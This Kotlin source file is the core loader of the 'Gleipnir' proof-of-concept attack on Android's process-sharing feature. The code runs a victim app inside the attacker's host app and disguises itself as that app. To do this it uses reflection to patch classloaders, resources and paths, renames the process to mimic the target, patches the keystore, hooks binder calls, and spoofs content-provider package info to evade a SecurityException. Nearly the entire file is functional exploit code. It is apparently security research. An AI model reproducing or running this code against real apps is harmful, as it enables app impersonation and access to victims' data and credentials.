/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.extendableLoader.internal

import android.app.Activity
import android.app.Application
import android.app.Instrumentation
import android.content.ComponentName
import android.content.Context
import android.content.ContextWrapper
import android.content.Intent
import android.content.pm.ActivityInfo
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.os.Looper
import android.os.Process
import android.util.Log
import android.view.ContextThemeWrapper
import org.gleipnir.app.R
import org.gleipnir.app.extendableLoader.*
import org.gleipnir.app.helpers.*
import org.gleipnir.app.helpers.binder.BinderHook
import org.gleipnir.app.helpers.extensions.*
import org.gleipnir.app.reflectionHelper.getDeclaredMethod
import org.gleipnir.app.reflectionHelper.getReflective
import org.gleipnir.app.reflectionHelper.setReflective
import org.gleipnir.app.security.KeystorePatcher
import java.io.File
import java.lang.reflect.Method

/**
 * This is the core implementation of the Attack.
 *
 * Here we modify the Android Stack and start the application and it's content providers.
 *
 * Services are currently not supported
 */
class LoaderContextImpl : LoaderContext {

    lateinit var hostActivity: Activity
    lateinit var plugins: List<IPlugin>
    lateinit var hostApplicationInfo: ApplicationInfo
    lateinit var targetPackageInfo: PackageInfo
    lateinit var targetPackageName: String
    lateinit var activityThread: Any
    lateinit var applicationThread: Any
    lateinit var classLoaderToUse: ClassLoader

    val paths = ApplicationPaths()
    val resources = ApplicationResources()

    override fun attach(
        hostActivity: Activity,
        plugins: List<IPlugin>,
        packageInfo: PackageInfo
    ) {
        log("LoaderContextImpl [-] attach [-] attached with ${plugins.size} plugins")
        this.hostActivity = hostActivity
        this.plugins = plugins
        this.hostApplicationInfo = ApplicationInfo(hostActivity.applicationInfo)
        this.targetPackageInfo = packageInfo
        this.targetPackageName = packageInfo.packageName
        activityThread = hostActivity.myGetActivityThread()
        applicationThread = hostActivity.getApplicationThread(activityThread)
    }

    /***************************************************
     * *************** Bind application ****************
     * *************************************************
     * Call the bindApplication function of android with a manipulated ApplicationInfo
     *
     * This can be optionally. If a plugin takes the call, we return.
     */
    override fun bind() {
        plugins.forEach {
            if (it.onBindApp(this)) {
                log("LoaderContextImpl [-] bind [-] plugin $it took the bind call, return")
                return@bind
            }
        }
        PackageInfoPatcher.patch(hostActivity, targetPackageInfo)
        KeystorePatcher.init()
//        handleBind()
    }

    /**
     * Not used currently.
     *
     * In future we'll replace the full applicationInfo in the initial application with the victim's application info.
     * // todo improve binder hooks to hook all calls to system services
     */
    fun handleBind() {
        var boundData =
            getBoundApplication(
                activityThread
            )
        setBoundActivity(
            activityThread,
            null
        )
        setReflective(activityThread, "mInitialApplication", null)
        //getReflective<ArrayMap<Any,Any>>(thread, "mPackages").clear()
        log("LoaderContextImpl [-] handleBind [-] call handleBindApplication")
        handleBindApplication(
            activityThread,
            targetPackageInfo,
            hostActivity.packageName,
            boundData
        )
    }

    /***************************************************
     * ********** Prepare the android stack ************
     * *************************************************
     *
     * Patch classloaders, resources, paths and much more
     */
    override fun prepareAndroidStack() {
        log("LoaderContextImpl [-] change processname")
        changeProcessName(targetPackageName)

        log("LoaderContextImpl [-] prepare new application paths")
        setExceptionHandler()

        log("LoaderContextImpl [-] prepare new application paths")
        createPaths()

        log("LoaderContextImpl [-] prepareAndroidStack [-] Install binder hooks")
        BinderHook.installHooks(hostActivity)
        /*   optionally
            fun updateResources() {
                resourcesManager = getResourcesManager(thread)
                applyNewResourceDirsLocked(resourcesManager, applicationInfo)
            }
        */
        /*
         * Some apps don't extract their libraries using the AndroidManifest flag... let's do it for them ;)
         */
        if (targetPackageInfo.applicationInfo.flags and ApplicationInfo.FLAG_EXTRACT_NATIVE_LIBS != ApplicationInfo.FLAG_EXTRACT_NATIVE_LIBS) {
            log("LoaderContextImpl [-] prepareAndroidStack [-] extract native libs")
            extractNativeLibs()
        }

        log("LoaderContextImpl [-] prepareAndroidStack [-] prepare classes and classloaders")
        patchClasses()

        log("LoaderContextImpl [-] prepareAndroidStack [-] prepare resources")
        patchResources()

        log("LoaderContextImpl [-] prepareAndroidStack [-] Update all loaded apk instances")
        patchAllLoadedApkInstances()

        log("LoaderContextImpl [-] prepareAndroidStack [-] Patch keystore")
        KeystorePatcher.patch()

        log("LoaderContextImpl [-] prepareAndroidStack [-] prepare android stack was successful")
    }

    /**
     * Set an exception handler to catch unwanted crashes...
     * Potentially exceptions can happen that don't affect the app functionality. Let's catch them and continue.
     * Works for all threads, except of main / looper thread.
     */
    fun setExceptionHandler() {
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            log("LoaderContextImpl [-] UncaughtExceptionHandler [-] trying to catch ${throwable.message} of thread ${thread.id}")
            log("LoaderContextImpl [-] UncaughtExceptionHandler [-] ", throwable)

            if (Looper.getMainLooper().thread.id == thread.id) {
                // just loop... and pray :( :(
                Looper.loop()
            } else {
                // just join the looper and pray...
                Looper.getMainLooper().thread.join()
            }
        }
    }

    /**
     * Patch paths of target application to point to a path of host application's control.
     */
    fun createPaths() {
        // prepare destination for native libs
        paths.nativePath =
            File(hostActivity.filesDir.absolutePath + "/libs/" + targetPackageInfo.packageName)
        paths.nativePath.mkdirs()

        // prepare destination for apks
        var appsLocation = File(hostActivity.filesDir.absolutePath + "/" + "apps" + "/")
        appsLocation.mkdirs()

        paths.apkPath = File(
            appsLocation.absolutePath
                    + "/" + targetPackageInfo.packageName + "-1.apk"
        )

        paths.dataDir =
            File(hostActivity.filesDir.absolutePath + "/" + targetPackageInfo.packageName)
        paths.dataDir.mkdirs()
        paths.protectedDir =
            File(hostActivity.filesDir.absolutePath + "/" + targetPackageInfo.packageName + "/prot/")
        paths.protectedDir.mkdirs()


        // ask plugins for other paths
        plugins.forEach {
            it.onCreatePaths(this, paths)
        }


        // source paths
        val srcNativeFolder = File(targetPackageInfo.applicationInfo.nativeLibraryDir)
        var sourceApk = File(targetPackageInfo.applicationInfo.sourceDir)

        // copy files
        log("LoaderContextImpl [-] copy native libs from $srcNativeFolder into ${paths.nativePath}")
        log("LoaderContextImpl [-] public source dir ${targetPackageInfo.applicationInfo.publicSourceDir}")
        // additional resource paths
        File(targetPackageInfo.applicationInfo.publicSourceDir).parentFile?.listFiles()?.forEach {
            if (it.name.endsWith(".apk")) {
                paths.resourceApks.add(it.absolutePath)
            }
        }
        copyAllFiles(srcNativeFolder, paths.nativePath)

        log("LoaderContextImpl [-] copy apk $sourceApk to ${paths.apkPath}")
        copy(sourceApk, paths.apkPath)

        // prepare packgeInfo
        targetPackageInfo.applicationInfo.sourceDir = paths.apkPath.absolutePath
        targetPackageInfo.applicationInfo.nativeLibraryDir = paths.nativePath.absolutePath
        targetPackageInfo.applicationInfo.dataDir = paths.dataDir.absolutePath
        targetPackageInfo.applicationInfo.deviceProtectedDataDir = paths.protectedDir.absolutePath
        setReflective(
            targetPackageInfo.applicationInfo,
            "credentialProtectedDataDir",
            paths.protectedDir.absolutePath
        )
    }

    /**
     * Extract all native libraries into the fresh created native lib path
     */
    fun extractNativeLibs() {
        paths.apkPath?.let {
            ApkZipHelper.unpackLibraries(paths.nativePath.absolutePath, it.absolutePath)
        }
        paths.resourceApks.forEach {
            ApkZipHelper.unpackLibraries(paths.nativePath.absolutePath, it)
        }
    }

    /**
     * ClassLoaders
     *
     * Patch classloaders to load target application classes
     */
    fun patchClasses() {
        /**
         * Android will use system classloader to create new activities or services.
         * So let's patch it
         */
        classLoaderToUse = ClassLoader.getSystemClassLoader()
        //getPackageClassLoader(activityThread, hostActivity)!!
        //hostActivity.classLoader // we start with our activity classloader... maybe we need another one in future
        log("LoaderContextImpl [-] use classloader $classLoaderToUse ${classLoaderToUse.hashCode()}")
        plugins.forEach {
            it.onPrepareClassLoader(this, classLoaderToUse)
        }
        patchClassLoaders(classLoaderToUse)
    }

    /**
     * Patch the given classloader to load target application classes and libraries
     */
    fun patchClassLoaders(classLoaderToUse: ClassLoader) {
        // patch our class loader
        classLoaderToUse.patch(
            paths.apkPath.absolutePath,
            paths.nativePath.absolutePath
        )
        classLoaderToUse.patch( // pre android 10
            "/system/framework/org.apache.http.legacy.boot.jar",
            paths.nativePath.absolutePath
        )
        classLoaderToUse.patch( // post android 10
            "/system/framework/org.apache.http.legacy.jar",
            paths.nativePath.absolutePath
        )
        paths.resourceApks.forEach {
            classLoaderToUse.patch(
                it,
                it
            )
        }

        // patch and replace our package class loader
        patchPackageClassLoader(
            activityThread,
            hostActivity,
            classLoaderToUse,
            paths.apkPath.absolutePath,
            paths.nativePath.absolutePath
        )
        // patch all classloaders of all packages
        patchClassLoaderOfAllPackages(
            activityThread,
            hostActivity,
            classLoaderToUse,
            paths.apkPath.absolutePath,
            paths.nativePath.absolutePath
        )
    }


    /**
     * Resources
     *
     * Patch resources to load target application's resources
     */
    fun patchResources() {
        // create new empty assetmanager
        resources.assets = createAssetManager()
        resources.assets.addAssetPath(paths.apkPath.absolutePath) // first add base.apk
        paths.resourceApks.forEach {
            resources.assets.addAssetPath(it) // add additional asset path
        }
        log("LoaderContextImpl [-] use asset manager ${resources.assets}")

        // create resources impl
        resources.resorucesImpl = createResourcesImpl(resources.assets, hostActivity)


        val resourcesManager = getResourcesManager(activityThread)
        // patch resource manager resources
        patchResourcesManagerResources(
            resourcesManager,
            paths.apkPath.absolutePath,
            paths.nativePath.absolutePath,
            resources.resorucesImpl
        )

        // patch resource manager impls
        replaceResourcesManagerImpls(resourcesManager, resources.resorucesImpl)
        val newResources = createResources(classLoaderToUse, resources.resorucesImpl)
        resources.resources = ResourceHelper(
            newResources.assets,
            newResources.displayMetrics,
            newResources.configuration,
            newResources,
            targetPackageName,
            hostActivity.packageName
        )

        // patch host activity
        patchContextResources(hostActivity)
        patchContextResources(hostActivity.applicationContext)
        patchContextResources(hostActivity.application)
        patchContextResources(hostActivity.baseContext)
        getReflective<Application>(hostActivity.myGetActivityThread(), "mInitialApplication")?.let {
            patchContextResources(it)
        }

        // patch all packages
        patchResourcesOfAllPackages(activityThread, resources.resorucesImpl)

        // enforce update
        applyNewResourceDirsLocked(resourcesManager, targetPackageInfo.applicationInfo)


    }

    /**
     * Patch resources of given context instance
     */
    fun patchContextResources(context: Context) {
        if (context is ContextThemeWrapper) {
            context.setResources(resources.resources)
        }
        if (context is ContextWrapper) {
            context.patchBaseResources(
                resources.resources,
                hostActivity,
                resources.assets,
                targetPackageName
            )
            context.setTheme(targetPackageInfo.applicationInfo.theme)
            //context.setBaseTheme(targetPackageInfo.applicationInfo.theme)
            File("")
        }
    }

    /**
     * Patch LoadedApk instances of ActivityThread
     *
     * LoadedApk represents a loaded apk file.
     */
    fun patchAllLoadedApkInstances() {
        getPackages(activityThread)?.forEach { entry ->
            val loadedApk = entry.value.get()
            loadedApk?.let {
                setReflective(loadedApk, "mAppDir", paths.apkPath.absolutePath)
                setReflective(loadedApk, "mLibDir", paths.nativePath.absolutePath)
                setReflective(loadedApk, "mDataDir", paths.dataDir.absolutePath)
                setReflective(loadedApk, "mDataDirFile", paths.dataDir)
                setReflective(loadedApk, "mDeviceProtectedDataDirFile", paths.dataDir)
                setReflective(loadedApk, "mCredentialProtectedDataDirFile", paths.dataDir)
                setReflective(loadedApk, "mResources", resources.resources)
                //setReflective(loadedApk, "mPackageName", targetPackageName)
            }
        }
    }

    /**
     * Cleans application references to host application and injects the new application info
     *
     * Needed for create a new application instance
     */
    fun prepareApplicationCreation() {
        updateApplicationInfo(
            hostActivity.application.getLoadedApk(),
            targetPackageInfo.applicationInfo
        )
        setReflective(hostActivity.application.getLoadedApk(), "mApplication", null)
        setReflective(hostActivity.application.getLoadedApk(), "mClassLoader", classLoaderToUse)
    }

    /**
     * Change process name to target application package name
     * this will let /proc/[pid]/cmdline look like taret application
     */
    fun changeProcessName(packageName: String) {
        log("LoaderContextImpl [-] change process name to ${packageName}")
        val method =
            getDeclaredMethod(
                Process::class.java,
                "setArgV0",
                String::class.java
            )
        method?.isAccessible = true
        method?.invoke(null, packageName)
    }

    /***************************************************
     * **************** Launch target  *****************
     * *************************************************
     *
     * Launch content provider, application and main activity
     *
     * Also inject some observers in order to control the launch
     */
    override fun launch() {
        log("LoaderContextImpl [-] instanciate target application ${targetPackageInfo.applicationInfo.name}")
        // install observers
        launchInstrumentationObserver()
        JobObserver.injectJobObserver(hostActivity) // TODO finalize job service solution
        /*try {
            AppComponentFactoryObserver.injectAppComponentFactoryObserver(activityThread)
        } catch (exception: Exception) {
            log(
                "LoaderContextImpl [-] launch [-] unable to inject AppComponentFactoryObserver",
                exception
            )
        }*/


        hostActivity.runOnUiThread {

            // start content providers
            log("LoaderContextImpl [-] launch content providers")
            createContentProviders()

            // prepare application creation. => Remove gleipnir's application instance
            log("LoaderContextImpl [-] launch [-] Prepare application creation")
            prepareApplicationCreation()

            // call application onCreate
            log("LoaderContextImpl [-] launch application onCreate")
            try {
                makeApplication(
                    hostActivity.application.getLoadedApk(),
                    getInstrumentation(activityThread) as Instrumentation
                )
            } catch (exception: java.lang.Exception) {
                log("LoaderContextImpl [-] launch [-] Start application failed", exception)
            }

            // inject packagemanager helper
            val initialApplication = getReflective<Application>(
                hostActivity.myGetActivityThread(),
                "mInitialApplication"
            )
            initialApplication?.let {
                PackageManagerHelper.inject(initialApplication, targetPackageInfo)
            }

            // launch activity
            launchMainActivity()
        }

    }


    /**
     * Installs an instrumentation observer that offers more extended callbacks regarding the Activity lifecycle.
     *
     * For example we need the onNewActivity callback to replace the activity info placed by Android
     * with the original one fetched via the PackageInfo of the victim App.
     */
    private fun launchInstrumentationObserver() {
        observeActivities(hostActivity, targetPackageInfo, object : ActivityObserverCallback {

            val mActivityInfoField =
                Activity::class.java.getDeclaredField("mActivityInfo")

            val resourcesField =
                ContextThemeWrapper::class.java.getDeclaredField("mResources")

            val mBaseField =
                ContextWrapper::class.java.getDeclaredField("mBase")

            init {
                mActivityInfoField.isAccessible = true
                resourcesField.isAccessible = true
                mBaseField.isAccessible = true
            }

            /**
             * Launched when a new activity was instantiated.
             * onAttach and onCreate was NOT called.
             *
             * @param newActivity the new activity that was instantiated
             */
            override fun onNewActivity(newActivity: Activity) {
                plugins.forEach {
                    it.onNewActivity(this@LoaderContextImpl, newActivity)
                }
                getActivityInfoForActivity(newActivity)?.let {
                    //mBaseField.set(newActivity, applicationInstance)
                    log("set activtiy ${it.applicationInfo}")
                    mActivityInfoField.set(
                        newActivity,
                        it
                    ) // replace "TrampolineX" activity info with the corresponding original activity info
                }

                /**
                 * Replace again with the target application info
                 */
                targetPackageInfo.providers?.forEach { // provider hack part 2
                    it.applicationInfo = targetPackageInfo.applicationInfo
                }
            }


            /**
             * Called just before the onCreate call.
             *
             * @param activity the activity the onCreate call will happen
             */
            override fun onPreActivityOnCreate(activity: Activity?) {
                activity?.let { newActivity ->
                    plugins.forEach {
                        it.onPreCreateActivity(this@LoaderContextImpl, activity)
                    }
                    getActivityInfoForActivity(newActivity)?.let {
                        log(
                            "LoaderContextImpl [-] ActivityObserver [-] hack activity: $newActivity with theme <${it.themeResource}>"
                        )
                        // inject target activity info
                        mActivityInfoField.set(newActivity, it)

                        // patch activities resoruces (just for the case...)
                        patchContextResources(newActivity)

                        // inject packagemanager helper
                        //PackageManagerHelper.inject(newActivity, targetPackageInfo)
                        val applicationBaseContext = newActivity.applicationContext
                        if (applicationBaseContext is ContextWrapper) {
                            PackageManagerHelper.inject(applicationBaseContext, targetPackageInfo)
                        }
                        setReflective(
                            newActivity,
                            ContextWrapper::class.java,
                            "mBase",
                            object : ContextWrapper(newActivity.baseContext) {
                                override fun getPackageName(): String {
                                    return targetPackageName
                                }

                                override fun startService(service: Intent?): ComponentName? {
                                    log("LoaderContextImpl [-] ContextWrapper [-] startService [-] $service")
                                    return super.startService(service)
                                }
                            }
                        )

                        /*
                         * Fix theme
                         *
                         * The theme set by ActivityThread doesn't match to the theme wanted by the target application
                         */
                        setReflective(newActivity, ContextThemeWrapper::class.java, "mTheme", null)
                        var themeToSet = 0
                        if (it.theme != 0) { // activity custom theme
                            themeToSet = it.theme
                        } else { // sytem theme
                            themeToSet = targetPackageInfo.applicationInfo.theme
                        }
                        if (themeToSet != 0) {
                            log(
                                "LoaderContextImpl [-] ActivityObserver [-] hack activity: $newActivity set theme $themeToSet (${activity.resources.getResourceEntryName(
                                    themeToSet
                                )})>"
                            )
                            newActivity.setTheme(it.themeResource)
                            Log.d(
                                "LoaderContextImpl",
                                "LoaderContextImpl [-] got resource ${newActivity.resources.getResourceEntryName(
                                    themeToSet
                                )}"
                            )
                        }

                        // resource check
                        var isGLeipnir = ""
                        try {
                            isGLeipnir =
                                activity.resources.getResourceEntryName(R.string.is_gleipnit) // check if gleipnir resources are loaded or taret resources...
                        } catch (exception: Exception) {
                            // suppress. Crash would be a good case!
                        }
                        if (isGLeipnir == "is_gleipnit") {
                            throw RuntimeException("Resource creation failed!")
                        } else {
                            Log.d(
                                "LoaderContextImpl",
                                "LoaderContextImpl [-] found ${isGLeipnir}"
                            )
                        }
                    }
                }
            }

            /**
             * Called once the activity onCreate was called
             *
             * @param activity the activity onCreate was called
             */
            override fun onPostActivityOnCreate(activity: Activity) {
                plugins.forEach {
                    it.onPostCreateActivity(this@LoaderContextImpl, activity)
                }
            }

            /**
             * Called when a new activity shall be launched.
             *
             * @param intent the start intent
             */
            override fun onStartActivity(intent: Intent?) {
            }

            fun getActivityInfoForActivity(activity: Activity): ActivityInfo? {
                return targetPackageInfo.activities.find { info ->
                    info.name == activity::class.java.name
                }
            }

        })
    }

    /**
     * Create and launch victim's Content providers
     */
    fun createContentProviders() {
        targetPackageInfo.providers?.forEach {
            try {
                val providerInfo = it
                // use gleipnir application info!! To bypass the SecurityException raised in ActivityThread! We'll replace it when the first Activity was started
                /*
                 * https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/app/ActivityThread.java#6975
                 *
                 * https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/app/ActivityThread.java#6982
                 */
                providerInfo.applicationInfo =
                    ApplicationInfo(targetPackageInfo.applicationInfo)
                providerInfo.applicationInfo.uid = hostActivity.applicationInfo.uid
                providerInfo.packageName = hostActivity.packageName  // provider hack part 1

                providerInfo.applicationInfo.packageName = hostActivity.packageName
                //providerInfo.applicationInfo.dataDir = paths.dataDir.absolutePath
                providerInfo.authority?.let {
                    providerInfo.authority += ";" + providerInfo.authority.replace(
                        targetPackageName,
                        hostActivity.packageName,
                        false
                    )
                }

                log("LoaderContextImpl [-] installProvider provider ${it.name}, ${providerInfo.authority}")
                installProvider(applicationThread, providerInfo)
            } catch (exception: java.lang.Exception) {
                log("LoaderContextImpl [-] unable to launch content provider ${it.name} ${exception.message}")
                throw exception
            }
        }
    }

    /**
     * Search and launch the MainActivity of the victim App
     */
    fun launchMainActivity() {
        hostActivity.packageManager.getLaunchIntentForPackage(targetPackageInfo.packageName)
            ?.let { intent ->
                log(
                    "LoaderContextImpl [-] got launch intent: ${intent.component?.className}"
                )

                val pinfo = hostActivity.packageManager.getPackageInfo(
                    targetPackageInfo.packageName,
                    PackageManager.GET_ACTIVITIES
                )

                intent.component?.className?.let { activityClassName ->
                    pinfo.activities.forEach { it2 ->
                        it2?.let { activtiyInfo ->

                            activtiyInfo.name?.let { targetActivity ->
                                if (targetActivity == activityClassName) {
                                    log(
                                        "LoaderContextImpl [-] load activity $activityClassName"
                                    )
                                    log(
                                        "LoaderContextImpl [-] target activity ${activtiyInfo.targetActivity} : ${activtiyInfo.launchMode} : name ${activtiyInfo.name}"
                                    )
                                    val component =
                                        intent.resolveActivity(hostActivity.packageManager)
                                    log(
                                        "LoaderContextImpl  [-] original component ${intent.component} resolved component: $component"
                                    )
                                    var mainActivity = activtiyInfo.targetActivity?.let {
                                        classLoaderToUse.loadClass(it) as Class<Activity>
                                    } ?: kotlin.run {
                                        classLoaderToUse.loadClass(component?.className) as Class<Activity>
                                    }

                                    log(
                                        "LoaderContextImpl  [-] loaded class $mainActivity"
                                    )
                                    val myLaunchIntent = Intent(hostActivity, mainActivity)
                                    log(
                                        "LoaderContextImpl  [-] start activity $mainActivity"
                                    )

                                    launchActivity(myLaunchIntent)
                                }
                            }
                        }
                    }
                } ?: kotlin.run {
                    log(
                        "LoaderContextImpl  [-] unable to load default activtiy"
                    )
                }
            }
    }

    /**
     * Cal startActivity using the given intent
     *
     * @param intent to be used for the startActivity call.
     */
    fun launchActivity(intent: Intent) {
        log("LoaderContextImpl [-] advice to start activity ${intent.component}")
        hostActivity.startActivity(intent)

    }


    /**
     * Return the target package
     */
    override fun getTargetPackgeInfo(): PackageInfo {
        return targetPackageInfo
    }
}